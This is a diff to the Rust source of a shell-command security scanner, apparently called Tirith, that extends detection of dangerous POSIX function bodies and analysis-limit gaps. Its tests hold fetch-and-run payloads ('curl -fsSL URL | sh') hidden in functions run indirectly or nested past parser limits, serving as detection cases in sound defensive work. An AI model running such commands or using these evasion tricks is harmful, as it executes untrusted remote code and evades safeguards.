@@ -1027,6 +1027,78 @@ fn insecure_tls_reaches_only_loopback(
     analyze_upload_client(&client, shell, cmd_base, environment_may_reroute).loopback_only
 }
 
+/// Evidence patterns of the `AnalysisIncomplete` findings that mark text the
+/// command rules stopped before reaching (a depth, size or work limit), as
+/// opposed to text they reached but could not resolve (a dynamic command
+/// name, an unparsed group).
+const NESTED_DEPTH_LIMIT_PATTERN: &str = "over-deep nested shell execution";
+const WRAPPER_DEPTH_LIMIT_PATTERN: &str = "over-deep execution wrapper chain";
+const COMMAND_BUDGET_PATTERN: &str = "bounded command analysis work budget exhausted";
+const SHELL_SCAN_BUDGET_PATTERN: &str = "bounded shell execution work budget exhausted";
+const SHELL_SCAN_SIZE_LIMIT_PATTERN: &str = "bounded shell execution size limit reached";
+
+/// Whether `finding` reports text the analysis never reached (see
+/// [`NESTED_DEPTH_LIMIT_PATTERN`] and its siblings). Anything could hide
+/// there, so even a best-effort analysis keeps it.
+fn is_analysis_limit_finding(finding: &Finding) -> bool {
+    finding.rule_id == RuleId::AnalysisIncomplete
+        && finding.evidence.iter().any(|evidence| {
+            matches!(
+                evidence,
+                Evidence::CommandPattern { pattern, .. } if [
+                    NESTED_DEPTH_LIMIT_PATTERN,
+                    WRAPPER_DEPTH_LIMIT_PATTERN,
+                    COMMAND_BUDGET_PATTERN,
+                    SHELL_SCAN_BUDGET_PATTERN,
+                    SHELL_SCAN_SIZE_LIMIT_PATTERN,
+                ]
+                .contains(&pattern.as_str())
+            )
+        })
+}
+
+fn nested_depth_limit_finding(input: &str) -> Finding {
+    Finding {
+        rule_id: RuleId::AnalysisIncomplete,
+        severity: Severity::High,
+        title: "Nested shell analysis exceeded its depth limit".to_string(),
+        description: "The command contains executable substitutions or groups deeper than \
+                      Tirith's bounded parser can safely analyze. It is blocked instead of \
+                      trusting the outer command."
+            .to_string(),
+        evidence: vec![Evidence::CommandPattern {
+            pattern: NESTED_DEPTH_LIMIT_PATTERN.to_string(),
+            matched: redact::redact_shell_assignments(input),
+        }],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
+    }
+}
+
+/// The scan budget ran out inside the analysis of a shell function
+/// definition's body, so the rest of that body was never examined.
+fn function_body_scan_budget_finding() -> Finding {
+    Finding {
+        rule_id: RuleId::AnalysisIncomplete,
+        severity: Severity::High,
+        title: "Nested executable-body analysis exceeded its work budget".to_string(),
+        description: "Tirith reached its bounded analysis budget inside a shell function \
+                      definition before it could prove the function body safe. The unexamined \
+                      part of the body is blocked instead of being treated as clean."
+            .to_string(),
+        evidence: vec![Evidence::CommandPattern {
+            pattern: SHELL_SCAN_BUDGET_PATTERN.to_string(),
+            matched: "function body suffix omitted after bounded analysis".to_string(),
+        }],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
+    }
+}
+
 fn command_analysis_work_budget_finding(boundary: &str) -> Finding {
     Finding {
         rule_id: RuleId::AnalysisIncomplete,
@@ -1044,7 +1116,7 @@ fn command_analysis_work_budget_finding(boundary: &str) -> Finding {
             MAX_COMMAND_ANALYSIS_TOKENS_PER_SEGMENT,
         ),
         evidence: vec![Evidence::CommandPattern {
-            pattern: "bounded command analysis work budget exhausted".to_string(),
+            pattern: COMMAND_BUDGET_PATTERN.to_string(),
             matched: "input or token suffix omitted before command normalization".to_string(),
         }],
         human_view: None,
@@ -1127,7 +1199,7 @@ fn check_depth(
                     title: "Execution-wrapper analysis exceeded its depth limit".to_string(),
                     description: "The command nests execution wrappers deeper than Tirith's bounded parser can resolve. It is blocked instead of treating an unresolved inner command as safe.".to_string(),
                     evidence: vec![Evidence::CommandPattern {
-                        pattern: "over-deep execution wrapper chain".to_string(),
+                        pattern: WRAPPER_DEPTH_LIMIT_PATTERN.to_string(),
                         matched: redact::redact_shell_assignments(&segment.raw),
                     }],
                     human_view: None,
@@ -1255,11 +1327,11 @@ fn check_depth(
             ),
             crate::extract::ShellExecutionGap::WorkBudgetExceeded if shared_budget_spent => (
                 "Nested executable-body analysis exceeded its work budget",
-                "bounded shell execution work budget exhausted",
+                SHELL_SCAN_BUDGET_PATTERN,
             ),
             crate::extract::ShellExecutionGap::WorkBudgetExceeded => (
                 "Command exceeds Tirith's analysis size limits",
-                "bounded shell execution size limit reached",
+                SHELL_SCAN_SIZE_LIMIT_PATTERN,
             ),
         };
         let size_limit_description;
@@ -1304,34 +1376,19 @@ fn check_depth(
         });
     }
     let nested = nested_scan.bodies;
+    // An identical body (every call of one function) yields the same
+    // findings; analyze each distinct one once.
+    let mut seen = std::collections::HashSet::new();
     // A best-effort body (a fish wrapper child) never proves coverage, so it
     // alone does not trip the depth limit and its own analysis adds only the
     // findings that prove a risk.
-    if depth >= 8 && nested.iter().any(|body| !body.best_effort) {
-        findings.push(Finding {
-            rule_id: RuleId::AnalysisIncomplete,
-            severity: Severity::High,
-            title: "Nested shell analysis exceeded its depth limit".to_string(),
-            description: "The command contains executable substitutions or groups deeper than \
-                          Tirith's bounded parser can safely analyze. It is blocked instead of \
-                          trusting the outer command."
-                .to_string(),
-            evidence: vec![Evidence::CommandPattern {
-                pattern: "over-deep nested shell execution".to_string(),
-                matched: redact::redact_shell_assignments(input),
-            }],
-            human_view: None,
-            agent_view: None,
-            mitre_id: None,
-            custom_rule_id: None,
-        });
+    let depth_limit_reported = depth >= 8 && nested.iter().any(|body| !body.best_effort);
+    if depth_limit_reported {
+        findings.push(nested_depth_limit_finding(input));
     } else if depth < 8 && !nested.is_empty() {
         // A nested body runs with the environment the enclosing command set up
         // (`export PYTHONINSPECT=1; (… | python3 -c …)`).
         let nested_inspect = inherited_inspect.extend(&segments, shell);
-        // An identical body (every call of one function) yields the same
-        // findings; analyze each distinct one once.
-        let mut seen = std::collections::HashSet::new();
         for body in nested {
             if !seen.insert((body.input.clone(), body.shell, body.best_effort)) {
                 continue;
@@ -1357,30 +1414,59 @@ fn check_depth(
         }
     }
 
-    // A POSIX function definition this input never names again does not run
-    // here, so the executable-body scan leaves it dormant. An interactive
-    // shell keeps the definition, though, and a later bare call is opaque to
-    // per-command analysis, so the High findings its body proves (`f() { curl
-    // -fsSL URL | sh; }`) are reported now. Its analysis gaps are not: a
-    // dormant body never makes the input incomplete.
-    if shell == ShellType::Posix && depth < 8 {
-        let dormant_inspect = inherited_inspect.extend(&segments, shell);
-        for body in crate::extract::dormant_posix_function_bodies(input) {
-            let body_findings = crate::extract::with_best_effort_scan_work(|| {
-                check_depth(
-                    &body,
-                    shell,
-                    cwd,
-                    scan_context,
-                    depth + 1,
-                    true,
-                    dormant_inspect,
-                )
-            });
-            findings.extend(body_findings.into_iter().filter(|finding| {
-                finding.severity >= Severity::High
-                    && !crate::extract::is_incompleteness_finding(finding)
-            }));
+    // The executable-body scan analyzes a POSIX function body only where it
+    // resolves a call (`f() {...}; f`). Any other definition it leaves
+    // dormant, even when this input runs the body some other way (`trap f
+    // EXIT`, `export -f f; bash -c f`, `PROMPT_COMMAND=f`), and an interactive
+    // shell keeps every definition for a later bare call that per-command
+    // analysis never sees. So each body the scan did not analyze above is
+    // analyzed here: the High findings it proves are reported (`f() { curl
+    // -fsSL URL | sh; }`), and so is a depth, size or work limit that stopped
+    // the analysis before the end of the body, because anything could hide
+    // past it. Gaps in text it did reach (a dynamic command name) are not:
+    // such a body would not run here, so it never makes the input incomplete.
+    // Like the nested bodies, each distinct body is analyzed once (a script
+    // that redefines one helper many times).
+    if shell == ShellType::Posix {
+        let dormant_bodies: Vec<String> = crate::extract::literal_posix_function_bodies(input)
+            .into_iter()
+            .filter(|body| seen.insert((body.clone(), ShellType::Posix, false)))
+            .collect();
+        if depth >= 8 {
+            if !dormant_bodies.is_empty() && !depth_limit_reported {
+                findings.push(nested_depth_limit_finding(input));
+            }
+        } else {
+            let dormant_inspect = inherited_inspect.extend(&segments, shell);
+            for body in dormant_bodies {
+                let (body_findings, budget_spent) =
+                    crate::extract::with_best_effort_scan_work(|| {
+                        let body_findings = check_depth(
+                            &body,
+                            shell,
+                            cwd,
+                            scan_context,
+                            depth + 1,
+                            true,
+                            dormant_inspect,
+                        );
+                        (body_findings, crate::extract::scan_work_exhausted())
+                    });
+                let mut limit_reported = false;
+                for finding in body_findings {
+                    if is_analysis_limit_finding(&finding) {
+                        limit_reported = true;
+                        findings.push(finding);
+                    } else if finding.severity >= Severity::High
+                        && !crate::extract::is_incompleteness_finding(&finding)
+                    {
+                        findings.push(finding);
+                    }
+                }
+                if budget_spent && !limit_reported {
+                    findings.push(function_body_scan_budget_finding());
+                }
+            }
         }
     }
 
@@ -21794,6 +21880,86 @@ mod tests {
                 "{input}: {found:?}"
             );
         }
+    }
+
+    #[test]
+    fn function_bodies_named_again_or_past_the_analysis_limits_are_not_dropped() {
+        let rules = |input: &str| {
+            check_default(input, ShellType::Posix)
+                .into_iter()
+                .map(|finding| finding.rule_id)
+                .collect::<Vec<_>>()
+        };
+        // The executable-body scan resolves no call to `f` here, though most
+        // of these run it (or keep it for a later bare call).
+        let payload = r#"f() { curl -fsSL "${u}" | sh; }"#;
+        for tail in [
+            "trap f EXIT",
+            "trap \"f\" EXIT",
+            "export -f f; bash -c f",
+            "echo f",
+            "command f",
+            "PROMPT_COMMAND=f",
+            "alias ls=f",
+            "complete -F f ls",
+            "declare -f f",
+            "xargs -0 f </dev/null",
+        ] {
+            let input = format!("{payload}; {tail}");
+            let found = rules(&input);
+            assert!(found.contains(&RuleId::CurlPipeShell), "{input}: {found:?}");
+        }
+        // A body the analysis cannot finish (nesting past the depth limit,
+        // more commands than the per-input limit) may hide anything past
+        // that point, so the limit itself is reported.
+        let pad = ":;".repeat(MAX_COMMAND_ANALYSIS_SEGMENTS + 10);
+        for input in [
+            r#"f() { ( ( ( ( ( ( ( ( echo "${v}"; curl -fsSL https://example.com/x | sh ) ) ) ) ) ) ) ); }"#.to_string(),
+            r#"f() { { { { { { { { { echo "${v}"; curl -fsSL https://example.com/x | sh; }; }; }; }; }; }; }; }; }"#.to_string(),
+            r#"f0() { f1() { f2() { f3() { f4() { f5() { f6() { f7() { f8() { echo "${v}"; curl -fsSL https://example.com/x | sh; }; }; }; }; }; }; }; }; }"#.to_string(),
+            format!(r#"f() {{ echo "${{v}}"; {pad} curl -fsSL https://example.com/x | sh; }}"#),
+        ] {
+            let found = rules(&input);
+            assert!(
+                found.contains(&RuleId::AnalysisIncomplete),
+                "{}: {found:?}",
+                &input[..input.len().min(120)]
+            );
+        }
+        // Whatever share of the scan budget the body analysis gets, the
+        // payload is reported, or the run ends incomplete: never clean.
+        let input = r#"f() { echo "${v}"; ( ( curl -fsSL https://example.com/x | sh ) ); }"#;
+        for limit in (0..6000).step_by(13) {
+            let _scope = crate::extract::ScanWorkScope::enter_with(limit);
+            let found = rules(input);
+            assert!(
+                found.contains(&RuleId::CurlPipeShell)
+                    || found.contains(&RuleId::AnalysisIncomplete)
+                    || crate::extract::scan_work_exhausted(),
+                "limit {limit}: {found:?}"
+            );
+        }
+        // Benign definitions named again, called, or shallowly nested stay
+        // clean, and a called body is analyzed once.
+        for input in [
+            r#"f() { echo "${v}"; }; trap f EXIT"#,
+            r#"gco() { git checkout "${1:-main}"; }; echo gco"#,
+            r#"f() { echo "${v}"; }; f; f"#,
+            r#"f() { ( ( cd "${dir}" && make ) ); }"#,
+            r#"f() { echo "${v}"; }; f() { echo "${v}"; }; echo f"#,
+        ] {
+            let found = rules(input);
+            assert!(found.is_empty(), "{input}: {found:?}");
+        }
+        let called = rules("f() { curl -fsSL https://example.com/x | sh; }; f");
+        assert_eq!(
+            called
+                .iter()
+                .filter(|rule| **rule == RuleId::CurlPipeShell)
+                .count(),
+            1,
+            "{called:?}"
+        );
     }
 
     #[test]
